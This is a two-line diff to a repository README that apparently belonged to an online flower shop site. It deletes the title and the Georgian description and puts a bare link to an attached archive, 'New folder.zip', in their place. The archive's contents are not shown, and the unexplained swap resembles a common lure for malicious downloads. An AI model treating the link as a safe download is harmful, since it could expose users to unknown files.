@@ -1,2 +1,1 @@
-# gabrielotinashvili1-stack.github.io
-ყვავილების ონლაინ მაღაზია
+[New folder.zip](https://github.com/user-attachments/files/29879897/New.folder.zip)
